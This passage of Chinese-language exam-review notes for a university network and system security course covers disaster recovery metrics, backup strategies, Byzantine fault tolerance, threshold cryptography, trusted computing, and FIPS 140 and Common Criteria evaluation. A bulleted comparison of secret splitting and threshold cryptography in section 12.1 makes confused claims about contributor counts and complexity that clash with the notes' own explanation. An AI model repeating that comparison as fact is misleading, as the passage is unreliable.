&lt;h2 id=&#34;思考题-1&#34;&gt;&lt;a href=&#34;#思考题-1&#34; class=&#34;headerlink&#34; title=&#34;思考题&#34;&gt;&lt;/a&gt;思考题&lt;/h2&gt;&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230105212629466.png&#34; alt=&#34;image-20230105212629466&#34; style=&#34;zoom:50%;&#34;&gt;

&lt;h1 id=&#34;第十次课：数据备份与灾难恢复&#34;&gt;&lt;a href=&#34;#第十次课：数据备份与灾难恢复&#34; class=&#34;headerlink&#34; title=&#34;第十次课：数据备份与灾难恢复&#34;&gt;&lt;/a&gt;第十次课：数据备份与灾难恢复&lt;/h1&gt;&lt;p&gt;PDRR模型,加入了一个R, restore&amp;#x2F;recovery,核心也是 业务连续性&lt;/p&gt;
&lt;p&gt;R代表Restore –即一旦系统遭到破坏，将采取一系列的措施如备份文件恢复、系统重置等功能，恢复系统服务。&lt;/p&gt;
&lt;h2 id=&#34;10-1-应急计划的概念&#34;&gt;&lt;a href=&#34;#10-1-应急计划的概念&#34; class=&#34;headerlink&#34; title=&#34;10.1 应急计划的概念&#34;&gt;&lt;/a&gt;10.1 应急计划的概念&lt;/h2&gt;&lt;p&gt;一个组织具备承受各种灾难，并在灾难引起环境变化中，保持主要任务顺利运行的能力&lt;/p&gt;
&lt;h2 id=&#34;10-2-业务连续性计划的概念，以及业务连续性计划与应急计划的区别和联系&#34;&gt;&lt;a href=&#34;#10-2-业务连续性计划的概念，以及业务连续性计划与应急计划的区别和联系&#34; class=&#34;headerlink&#34; title=&#34;10.2 业务连续性计划的概念，以及业务连续性计划与应急计划的区别和联系&#34;&gt;&lt;/a&gt;10.2 业务连续性计划的概念，以及业务连续性计划与应急计划的区别和联系&lt;/h2&gt;&lt;p&gt;在应急计划的基础上，通过制定业务连续性计划Business Continuity Plan (BCP)实现在故障或灾难中业务的恢复和保持。&lt;/p&gt;
&lt;p&gt;国际通行的做法是通过制定应急计划和业务连续性计划，确保系统在遭受灾难时，确保主要业务的正常运行.连续性计划和应急计划是应急管理的重要组成部分。连续性计划适用于组织业务自身；应急计划适用于支撑业务运行的信息系统。连续性计划是目标，应急计划是支撑。&lt;/p&gt;
&lt;h2 id=&#34;10-3-容灾备份系统的度量指标：-RPO，-RTO，-NRO-和-DOO&#34;&gt;&lt;a href=&#34;#10-3-容灾备份系统的度量指标：-RPO，-RTO，-NRO-和-DOO&#34; class=&#34;headerlink&#34; title=&#34;10.3 容灾备份系统的度量指标： RPO， RTO， NRO 和 DOO&#34;&gt;&lt;/a&gt;10.3 容灾备份系统的度量指标： RPO， RTO， NRO 和 DOO&lt;/h2&gt;&lt;p&gt;以恢复点为目标RPO（Recovery Point Object）；&lt;/p&gt;
&lt;p&gt;以恢复时间为目标RTO（Recovery Time Object） ；&lt;/p&gt;
&lt;p&gt;以网络恢复为目标NRO（Network Recovery Object） ；&lt;/p&gt;
&lt;p&gt;以服务支持能力保证为目标DOO （Serviceability Degrade Object） (降级运作目标)&lt;/p&gt;
&lt;h2 id=&#34;10-4-数据备份策略的区别和联系：完全备份、增量备份和差量备份&#34;&gt;&lt;a href=&#34;#10-4-数据备份策略的区别和联系：完全备份、增量备份和差量备份&#34; class=&#34;headerlink&#34; title=&#34;10.4 数据备份策略的区别和联系：完全备份、增量备份和差量备份&#34;&gt;&lt;/a&gt;10.4 数据备份策略的区别和联系：完全备份、增量备份和差量备份&lt;/h2&gt;&lt;p&gt;完全备份：对系统进行完全备份，优点是直观，缺点是数据重复量大，成本高，效率低&lt;/p&gt;
&lt;p&gt;增量备份：只备份上一次备份后数据的改变量，优点数据重复量少，节约空间，缩短时间，缺点，可靠性差，各个备份环环相连，任何一环出问题，都会影响整个备份链&lt;/p&gt;
&lt;p&gt; 差量备份：差量备份的数据是上一次全备份之后新增加和修改过的数据，例如每周周一全备份，之后差量备份，兼具前两者的优点&lt;/p&gt;
&lt;h2 id=&#34;思考题-2&#34;&gt;&lt;a href=&#34;#思考题-2&#34; class=&#34;headerlink&#34; title=&#34;思考题&#34;&gt;&lt;/a&gt;思考题&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230105220902684.png&#34; alt=&#34;image-20230105220902684&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;第十一次课：拜占庭容错系统&#34;&gt;&lt;a href=&#34;#第十一次课：拜占庭容错系统&#34; class=&#34;headerlink&#34; title=&#34;第十一次课：拜占庭容错系统&#34;&gt;&lt;/a&gt;第十一次课：拜占庭容错系统&lt;/h1&gt;&lt;h2 id=&#34;11-1-n-x3D-4，m-x3D-1，口头消息的拜占庭消息协商过程；&#34;&gt;&lt;a href=&#34;#11-1-n-x3D-4，m-x3D-1，口头消息的拜占庭消息协商过程；&#34; class=&#34;headerlink&#34; title=&#34;11.1 n&amp;#x3D;4，m&amp;#x3D;1，口头消息的拜占庭消息协商过程；&#34;&gt;&lt;/a&gt;11.1 n&amp;#x3D;4，m&amp;#x3D;1，口头消息的拜占庭消息协商过程；&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/xuyuzhuang1991/article/details/79638051&#34;&gt;https://blog.csdn.net/xuyuzhuang1991/article/details/79638051&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;11-2-masking-BQS的容错条件，及其一致性过程分析&#34;&gt;&lt;a href=&#34;#11-2-masking-BQS的容错条件，及其一致性过程分析&#34; class=&#34;headerlink&#34; title=&#34;11.2 masking BQS的容错条件，及其一致性过程分析&#34;&gt;&lt;/a&gt;11.2 masking BQS的容错条件，及其一致性过程分析&lt;/h2&gt;&lt;p&gt;​    假设：&lt;/p&gt;
&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106163643143.png&#34; alt=&#34;image-20230106163643143&#34; style=&#34;zoom:25%;&#34;&gt;



&lt;p&gt;​        在BQS中，由于无法区分信道&amp;#x2F;服务器失效，同一归结到服务器失效&lt;/p&gt;
&lt;p&gt;​        Reliable but Asynchronous（异步）：保证可以传输到达，但不对传输时间做保证&lt;/p&gt;
&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106163750407.png&#34; alt=&#34;image-20230106163750407&#34; style=&#34;zoom:25%;&#34;&gt;



&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106163924140.png&#34; alt=&#34;image-20230106163924140&#34; style=&#34;zoom:25%;&#34;&gt;

&lt;p&gt;服务器数量:n&lt;/p&gt;
&lt;p&gt;法定人数,quorum数量,即至少正常的数量:q&lt;/p&gt;
&lt;p&gt;失效的server数量:f&lt;/p&gt;
&lt;p&gt;可用性Availability&lt;/p&gt;
&lt;p&gt;​        任何情况下，总是会有Quorum来配合Client操作，因此n-f &amp;gt;&amp;#x3D; q&lt;/p&gt;
&lt;p&gt;一致性Consistency&lt;/p&gt;
&lt;p&gt;​        读出的结果，是最近一次写入的结果，最差情况下，读出的结果为q-（n-q）&lt;/p&gt;
&lt;p&gt;​        其中至少有2f+1台正确服务器（正确的服务器比失效的多），因此2q-n&amp;gt;&amp;#x3D;2f+1&lt;/p&gt;
&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;​    n至少是4f+1，q至少是3f+1，n为所有服务器数量，q为Quorum（写入和读出的q一致），f为失效服务器的数量&lt;/p&gt;
&lt;h2 id=&#34;让你设计一个容错的系统&#34;&gt;&lt;a href=&#34;#让你设计一个容错的系统&#34; class=&#34;headerlink&#34; title=&#34;让你设计一个容错的系统???&#34;&gt;&lt;/a&gt;让你设计一个容错的系统???&lt;/h2&gt;&lt;p&gt;针对口头消息，描述n&amp;#x3D;7, m&amp;#x3D;2的BGP协议过程&lt;/p&gt;
&lt;h1 id=&#34;第十二次课-门限密码学&#34;&gt;&lt;a href=&#34;#第十二次课-门限密码学&#34; class=&#34;headerlink&#34; title=&#34;第十二次课: 门限密码学&#34;&gt;&lt;/a&gt;第十二次课: 门限密码学&lt;/h1&gt;&lt;h2 id=&#34;12-1-密码拆分与门限密码的区别和联系&#34;&gt;&lt;a href=&#34;#12-1-密码拆分与门限密码的区别和联系&#34; class=&#34;headerlink&#34; title=&#34;12.1 密码拆分与门限密码的区别和联系&#34;&gt;&lt;/a&gt;12.1 密码拆分与门限密码的区别和联系&lt;/h2&gt;&lt;p&gt;秘密分享和门限密码不一样&lt;/p&gt;
&lt;p&gt;门限密码强调计算过程的拆分,秘密不会完整的出现在内存空间&lt;/p&gt;
&lt;p&gt;秘密分享会合成出来&lt;/p&gt;
&lt;p&gt;都有可生存特性, 门限密码保护密钥,&lt;/p&gt;
&lt;p&gt;一个实体发起或执行的密码操作，分散到多个实体组成的一个群体来执行。基础是秘密分享机制，对共享秘密进行重构时，大于等于门限值个数的实体合作恢复出秘密，对于操作（如签名或加密），可以在不出现共享秘密的情况下合作完成最终结果的生成。&lt;/p&gt;
&lt;p&gt;密码拆分和门限密码都是用于将一个密码分成多个分片，以便达到更高的安全性。但是，它们之间有一些区别：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;原理不同：密码拆分是通过将密码表示成多项式的形式，然后求值在若干个点上，得到若干个值，这些值就是密码的分片。而门限密码是通过对密码进行线性运算得到的。&lt;/li&gt;
&lt;li&gt;运算复杂度不同：密码拆分的运算复杂度为 O(n^2)，其中 n 是求值点的数量。而门限密码的运算复杂度为 O(n)。&lt;/li&gt;
&lt;li&gt;恢复密码所需的贡献者数量不同：密码拆分需要至少 n 个贡献者恢复密码，其中 n 是求值点的数量。而门限密码可以在 t 个贡献者中的任意 t 个贡献者恢复密码。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;密码拆分和门限密码都是用于提高密码的安全性的方法，但是它们的原理、运算复杂度和恢复密码所需的贡献者数量都不同。&lt;/p&gt;
&lt;h2 id=&#34;12-2-拉格朗日差值秘密拆分方案&#34;&gt;&lt;a href=&#34;#12-2-拉格朗日差值秘密拆分方案&#34; class=&#34;headerlink&#34; title=&#34;12.2 拉格朗日差值秘密拆分方案&#34;&gt;&lt;/a&gt;12.2 拉格朗日差值秘密拆分方案&lt;/h2&gt;&lt;p&gt;利用多项式曲线的秘密分享&lt;/p&gt;
&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106135453954.png&#34; alt=&#34;image-20230106135453954&#34; style=&#34;zoom:50%;&#34;&gt;

&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106135537740.png&#34; alt=&#34;image-20230106135537740&#34; style=&#34;zoom:50%;&#34;&gt;

&lt;h2 id=&#34;12-3-RSA门限密码实施过程&#34;&gt;&lt;a href=&#34;#12-3-RSA门限密码实施过程&#34; class=&#34;headerlink&#34; title=&#34;12.3 RSA门限密码实施过程&#34;&gt;&lt;/a&gt;12.3 RSA门限密码实施过程&lt;/h2&gt;&lt;p&gt;加法的什么什么.. 乘法的就算了&lt;/p&gt;
&lt;p&gt;比如给你来计算怎么拆分&lt;/p&gt;
&lt;h2 id=&#34;12-4-使用proactive-recovery对抗-mobile-adversary的基本原理&#34;&gt;&lt;a href=&#34;#12-4-使用proactive-recovery对抗-mobile-adversary的基本原理&#34; class=&#34;headerlink&#34; title=&#34;12.4 使用proactive recovery对抗 mobile adversary的基本原理&#34;&gt;&lt;/a&gt;12.4 使用proactive recovery对抗 mobile adversary的基本原理&lt;/h2&gt;&lt;p&gt;丢失了份额怎么快速地让影响消失&lt;/p&gt;
&lt;h1 id=&#34;第十三次课-自重构可信赖与终端安全&#34;&gt;&lt;a href=&#34;#第十三次课-自重构可信赖与终端安全&#34; class=&#34;headerlink&#34; title=&#34;第十三次课: 自重构可信赖与终端安全&#34;&gt;&lt;/a&gt;第十三次课: 自重构可信赖与终端安全&lt;/h1&gt;&lt;h2 id=&#34;13-1-美国提出的改变博弈（游戏）规则安全技术包括哪些？&#34;&gt;&lt;a href=&#34;#13-1-美国提出的改变博弈（游戏）规则安全技术包括哪些？&#34; class=&#34;headerlink&#34; title=&#34;13.1 美国提出的改变博弈（游戏）规则安全技术包括哪些？&#34;&gt;&lt;/a&gt;13.1 美国提出的改变博弈（游戏）规则安全技术包括哪些？&lt;/h2&gt;&lt;p&gt;四个安全技术,背景、内核、目标是什么?&lt;/p&gt;
&lt;h2 id=&#34;13-2-自重构可信赖与其它安全技术相比最大的安全特征是什么，其带来的安全优势又是什么？&#34;&gt;&lt;a href=&#34;#13-2-自重构可信赖与其它安全技术相比最大的安全特征是什么，其带来的安全优势又是什么？&#34; class=&#34;headerlink&#34; title=&#34;13.2 自重构可信赖与其它安全技术相比最大的安全特征是什么，其带来的安全优势又是什么？&#34;&gt;&lt;/a&gt;13.2 自重构可信赖与其它安全技术相比最大的安全特征是什么，其带来的安全优势又是什么？&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230105231732350.png&#34; alt=&#34;image-20230105231732350&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;13-3-移动终端TEE技术的5个基本安全特征及其含义。&#34;&gt;&lt;a href=&#34;#13-3-移动终端TEE技术的5个基本安全特征及其含义。&#34; class=&#34;headerlink&#34; title=&#34;13.3 移动终端TEE技术的5个基本安全特征及其含义。&#34;&gt;&lt;/a&gt;13.3 移动终端TEE技术的5个基本安全特征及其含义。&lt;/h2&gt;&lt;p&gt;可信执行环境TEE&lt;/p&gt;
&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230105232244371.png&#34; alt=&#34;image-20230105232244371&#34; style=&#34;zoom: 33%;&#34;&gt;



&lt;h1 id=&#34;第十四次课：可信计算&#34;&gt;&lt;a href=&#34;#第十四次课：可信计算&#34; class=&#34;headerlink&#34; title=&#34;第十四次课：可信计算&#34;&gt;&lt;/a&gt;第十四次课：可信计算&lt;/h1&gt;&lt;h2 id=&#34;可信计算的基本功能：公钥认证、完整性度量、证明；&#34;&gt;&lt;a href=&#34;#可信计算的基本功能：公钥认证、完整性度量、证明；&#34; class=&#34;headerlink&#34; title=&#34;可信计算的基本功能：公钥认证、完整性度量、证明；&#34;&gt;&lt;/a&gt;可信计算的基本功能：公钥认证、完整性度量、证明；&lt;/h2&gt;&lt;h2 id=&#34;CRTM和DRTM的概念及区别；&#34;&gt;&lt;a href=&#34;#CRTM和DRTM的概念及区别；&#34; class=&#34;headerlink&#34; title=&#34;CRTM和DRTM的概念及区别；&#34;&gt;&lt;/a&gt;CRTM和DRTM的概念及区别；&lt;/h2&gt;&lt;p&gt;DRTM旨在实现信任根的随时随地启动，以及可信启动过程的可重复&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106112518731.png&#34; alt=&#34;image-20230106112518731&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;TCG软件栈TSS的基本架构和作用；&#34;&gt;&lt;a href=&#34;#TCG软件栈TSS的基本架构和作用；&#34; class=&#34;headerlink&#34; title=&#34;TCG软件栈TSS的基本架构和作用；&#34;&gt;&lt;/a&gt;TCG软件栈TSS的基本架构和作用；&lt;/h2&gt;&lt;p&gt;可信支撑软件是操作系统层面安全应用可以调用可信计算平台提供的可信服务接口，从而为用户提供可信服务。&lt;br&gt;TSS（TCG Software Stack）是可信计算平台上TPM的支撑软件。 TSS 的作用主要是为操作系统和应用软件提供使用TPM的接口。&lt;br&gt;目前，TSS主要有TSS 1.2和TSS 2.0两个版本。其中基于TPM 2.0的TSS 2.0是最新的版本。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106112200763.png&#34; alt=&#34;image-20230106112200763&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;BIOS如何与TPM模块交互&#34;&gt;&lt;a href=&#34;#BIOS如何与TPM模块交互&#34; class=&#34;headerlink&#34; title=&#34;BIOS如何与TPM模块交互&#34;&gt;&lt;/a&gt;BIOS如何与TPM模块交互&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106112040751.png&#34; alt=&#34;image-20230106112040751&#34;&gt;&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106112102049.png&#34; alt=&#34;image-20230106112102049&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;完整性度量的应用，比如区块链区块头的完整性保护原理等。&#34;&gt;&lt;a href=&#34;#完整性度量的应用，比如区块链区块头的完整性保护原理等。&#34; class=&#34;headerlink&#34; title=&#34;完整性度量的应用，比如区块链区块头的完整性保护原理等。&#34;&gt;&lt;/a&gt;完整性度量的应用，比如区块链区块头的完整性保护原理等。&lt;/h2&gt;&lt;p&gt;tpm(可信平台模块):是专门为进行加密计算而创建的硬件。它与处理系统的其余部分在物理上隔离，并且通常是主板上的一个独立 IC。 &lt;/p&gt;
&lt;p&gt;tcg :TCG（Trusted Computing Grounp）架构-即从平台无关角度全局上阐述了可信平台模块TPM（Trusted Platform Module）的架构，功能，主要模块，工作原理，密钥管理方式等。&lt;/p&gt;
&lt;p&gt;tee:是芯片组上的一个区域，其工作方式类似于 TPM，但并未与芯片的其余部分物理隔离。&lt;/p&gt;
&lt;h1 id=&#34;十五次课&#34;&gt;&lt;a href=&#34;#十五次课&#34; class=&#34;headerlink&#34; title=&#34;十五次课&#34;&gt;&lt;/a&gt;十五次课&lt;/h1&gt;&lt;h2 id=&#34;15-1-信息安全测评体系结构；&#34;&gt;&lt;a href=&#34;#15-1-信息安全测评体系结构；&#34; class=&#34;headerlink&#34; title=&#34;15.1 信息安全测评体系结构；&#34;&gt;&lt;/a&gt;15.1 信息安全测评体系结构；&lt;/h2&gt;&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106114021512.png&#34; alt=&#34;image-20230106114021512&#34; style=&#34;zoom:50%;&#34;&gt;

&lt;p&gt;​		CMVP最底层: 密码模块的验证体系,  符合FIPS认证体系标准(通过这个标准来检测是否符合标准)&lt;/p&gt;
&lt;p&gt;​		在这基础上做一些安全功能: 基于密码模块的协议级功能 protocols&lt;/p&gt;
&lt;p&gt;​		执行安全功能的产品,比如什么浏览器,防火墙什么的,按照CC标准来做 安全产品&lt;/p&gt;
&lt;p&gt;​		800-37 53 系统级安全,类似于我国的等保&lt;/p&gt;
&lt;p&gt;​		再通过C&amp;amp;A 认证和认可来保证整个IT的安全&lt;/p&gt;
&lt;h2 id=&#34;15-2-密码技术在信息安全和测评体系结构中的作用；&#34;&gt;&lt;a href=&#34;#15-2-密码技术在信息安全和测评体系结构中的作用；&#34; class=&#34;headerlink&#34; title=&#34;15.2 密码技术在信息安全和测评体系结构中的作用；&#34;&gt;&lt;/a&gt;15.2 密码技术在信息安全和测评体系结构中的作用；&lt;/h2&gt;&lt;h2 id=&#34;15-3-FIPS-密码模块测评的基本概念，密码模块的-4-个级别、-5-个类别等&#34;&gt;&lt;a href=&#34;#15-3-FIPS-密码模块测评的基本概念，密码模块的-4-个级别、-5-个类别等&#34; class=&#34;headerlink&#34; title=&#34;15.3 FIPS 密码模块测评的基本概念，密码模块的 4 个级别、 5 个类别等&#34;&gt;&lt;/a&gt;15.3 FIPS 密码模块测评的基本概念，密码模块的 4 个级别、 5 个类别等&lt;/h2&gt;&lt;p&gt;FIPS 140分为两部分：CAVP和CMVP。其中CAVP为 有FIPS-approved或NIST-recommended的密码算法以 及它们的组件进行验证，且算法通过CAVP验证是整个模块通过CMVP的前置条件。CMVP按照FIPS140标准进行模块检测。&lt;/p&gt;
&lt;h3 id=&#34;5种类型，也称密码模块形态：&#34;&gt;&lt;a href=&#34;#5种类型，也称密码模块形态：&#34; class=&#34;headerlink&#34; title=&#34;5种类型，也称密码模块形态：&#34;&gt;&lt;/a&gt;5种类型，也称密码模块形态：&lt;/h3&gt;&lt;p&gt;· 硬件密码模块：密码边界规定为硬件边线。在硬件边界内可以包含固件和&amp;#x2F;或 软件，其中还可以包括操作系统。 &lt;/p&gt;
&lt;p&gt;· 软件密码模块：密码边界为执行在可修改的运行环境中的纯软件部件（可以是 一个或多个软件部件）和数据组件。软件密码模块的运行环境所包含的计算 平台和操作系统，在定义的密码边界之外。&lt;/p&gt;
&lt;p&gt;· 固件密码模块：密码边界为执行在受限的或不可修改的运行环境中的纯固件 部件划定界线。固件密码模块的运行环境所包含的计算平台和操作系统，在定义的密码边界之外，但是与固件模块明确绑定。受限运行环境指允许受控更 改的软件或者固件模块,如 Java 卡中的Java 虚拟机&lt;/p&gt;
&lt;p&gt;· 混合软件模块：密码边界为软件部件和不相交的硬件部件（即软件部件不在 硬件模块边界中）的集合划定界线。软件运行的环境所包含的计算平台和操作 系统，在定义的混合软件模块边界之外。&lt;/p&gt;
&lt;p&gt;· 混合固件模块：密码边界为固件部件和不相交的硬件部件（即固件部件不在 硬件模块边界中）的合成划定界线。固件运行的环境所包含的计算平台和操作系统，在定义的混合固件模块边界之外，但是与混合固件模块明确绑定。 &lt;/p&gt;
&lt;h3 id=&#34;4个级别（硬件4级，软件直观上只有2级）：&#34;&gt;&lt;a href=&#34;#4个级别（硬件4级，软件直观上只有2级）：&#34; class=&#34;headerlink&#34; title=&#34;4个级别（硬件4级，软件直观上只有2级）：&#34;&gt;&lt;/a&gt;4个级别（硬件4级，软件直观上只有2级）：&lt;/h3&gt;&lt;p&gt;· 1级：普通的密码产品+自测试&lt;/p&gt;
&lt;p&gt;· 2级：1级的产品+防拆测封条+（明确的角色鉴别）&lt;/p&gt;
&lt;p&gt;· 3级：2级的产品+拆除响应+EFP&amp;#x2F;EFT+可信信道+非入侵式 安全&lt;/p&gt;
&lt;p&gt;· 4级：3级的产品+响应封套  &lt;/p&gt;
&lt;p&gt; 测试针对每一个域的安全要求进行，最后针对各个域的评级中获得的最低评级作为整体评级，要求如下：&lt;/p&gt;
&lt;p&gt;1.在每一个域中独立地评级&lt;/p&gt;
&lt;p&gt;2.反映了模块能满足那个域中所有要求的最大级别&lt;/p&gt;
&lt;p&gt;3.除“运行环境”（不适用于硬件密码模块）、“ 物理安全”（不适用于软件密码模块）、“其他 攻击的缓解”等3个安全域外，其它的安全域都 是必选检测项目&lt;/p&gt;
&lt;p&gt;4.不能只选部分安全域做检测。&lt;/p&gt;
&lt;p&gt;5.如果一个域没有提供不同安全级别的要求，则评 级与模块整体安全级别相当  &lt;/p&gt;
&lt;p&gt;最后针对各个域的评级中获得的最低评级作为整体评级。&lt;/p&gt;
&lt;h2 id=&#34;15-4-CC-检测的基本概念，-包括-SFR、-SAR、-EAL-等；-ST-和-PP-的区别和联系，&#34;&gt;&lt;a href=&#34;#15-4-CC-检测的基本概念，-包括-SFR、-SAR、-EAL-等；-ST-和-PP-的区别和联系，&#34; class=&#34;headerlink&#34; title=&#34;15.4 CC 检测的基本概念， 包括 SFR、 SAR、 EAL 等； ST 和 PP 的区别和联系，&#34;&gt;&lt;/a&gt;15.4 CC 检测的基本概念， 包括 SFR、 SAR、 EAL 等； ST 和 PP 的区别和联系，&lt;/h2&gt;&lt;p&gt;CC是通用评估准则，是描述产品信息安全要求的通用结构和语言，含有标准化的信息安全要求组件和报的目录。CC用于开发保护轮廓（PP）和安全目标（ST），即特定产品的信息安全要求和规范，针对已知的信息安全要求评估产品和系统。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;其中安全功能要求（SFR）用于定义安全信息产品的安全功能，描述信息系产品提供的安全服务的要求。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;安全保障要求（SAR）用于确保信息产品的安全功能可以被有保障地实施。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;EAL是评估保证级，随着等级提升，安全保障的要求从少到多、由松到紧递增，每个评估保障级都是将安全保障要求的细节按一定方式搭配并固定下来。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ST是 对某个特定的评估目标TOE提出的要其 满足的安全功能要求（Security Functional Requirements）和安全保障要求（Security Assurance Requirements）。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;保护轮廓PP是对某一类产品提出的安全功能和安全保 障要求。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ST相当于产品实现方案，与实现相关，作者可能是信息安全产品厂商、开发者或者集成商。PP相当于产品标准，与实现无关（多个具体实现可能满足同一个PP要求），描述用户对这类产品的安全要求，作者可能是信息产品的用户或厂商。&lt;/p&gt;
&lt;h1 id=&#34;历史考题-根据学长学姐回忆&#34;&gt;&lt;a href=&#34;#历史考题-根据学长学姐回忆&#34; class=&#34;headerlink&#34; title=&#34;历史考题(根据学长学姐回忆)&#34;&gt;&lt;/a&gt;历史考题(根据学长学姐回忆)&lt;/h1&gt;&lt;h2 id=&#34;状态检测防火墙的原理&#34;&gt;&lt;a href=&#34;#状态检测防火墙的原理&#34; class=&#34;headerlink&#34; title=&#34;状态检测防火墙的原理&#34;&gt;&lt;/a&gt;状态检测防火墙的原理&lt;/h2&gt;&lt;p&gt;通过对连接的跟踪功能,实现对数据包状态监测,从而进行过滤,&lt;/p&gt;
&lt;p&gt;包过滤防火墙:只检查报头&lt;/p&gt;
&lt;p&gt;状态检测防火墙:检查报头+建立连接状态表&lt;/p&gt;
&lt;p&gt;应用级网关防火墙:检查报头 + 检查数据&lt;/p&gt;
&lt;p&gt;代理服务器型防火墙:&lt;/p&gt;
&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106115525824.png&#34; alt=&#34;image-20230106115525824&#34; style=&#34;zoom:25%;&#34;&gt;

&lt;h2 id=&#34;异常检测和误用检测的区别&#34;&gt;&lt;a href=&#34;#异常检测和误用检测的区别&#34; class=&#34;headerlink&#34; title=&#34;异常检测和误用检测的区别&#34;&gt;&lt;/a&gt;异常检测和误用检测的区别&lt;/h2&gt;&lt;p&gt;异常检测是建立用户正常的一个行为模式库,不在这里面的判定为异常的行为&lt;/p&gt;
&lt;p&gt;误用检测是…&lt;/p&gt;
&lt;p&gt;误用检测 的新特征的发现过程和它的运行(使用已有特征进行检测)是相互独立的,&lt;/p&gt;
&lt;p&gt;而异常检测的模式库更新通常是在IDS中完成,即一边运行,一边更新&lt;/p&gt;
&lt;h2 id=&#34;IPSEC和ssl的区别&#34;&gt;&lt;a href=&#34;#IPSEC和ssl的区别&#34; class=&#34;headerlink&#34; title=&#34;IPSEC和ssl的区别&#34;&gt;&lt;/a&gt;IPSEC和ssl的区别&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://m.yisu.com/ask/3162.html&#34;&gt;https://m.yisu.com/ask/3162.html&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;应急计划和连续性计划的区别。&#34;&gt;&lt;a href=&#34;#应急计划和连续性计划的区别。&#34; class=&#34;headerlink&#34; title=&#34;应急计划和连续性计划的区别。&#34;&gt;&lt;/a&gt;应急计划和连续性计划的区别。&lt;/h2&gt;&lt;h2 id=&#34;APT攻击的影响。&#34;&gt;&lt;a href=&#34;#APT攻击的影响。&#34; class=&#34;headerlink&#34; title=&#34;APT攻击的影响。&#34;&gt;&lt;/a&gt;APT攻击的影响。&lt;/h2&gt;&lt;h2 id=&#34;CC准则中st和pp的区别。&#34;&gt;&lt;a href=&#34;#CC准则中st和pp的区别。&#34; class=&#34;headerlink&#34; title=&#34;CC准则中st和pp的区别。&#34;&gt;&lt;/a&gt;CC准则中st和pp的区别。&lt;/h2&gt;&lt;h2 id=&#34;一个大秘密K由两个秘密s和m组成，两个子秘密不可以暴露，分发给n个人如何分发。&#34;&gt;&lt;a href=&#34;#一个大秘密K由两个秘密s和m组成，两个子秘密不可以暴露，分发给n个人如何分发。&#34; class=&#34;headerlink&#34; 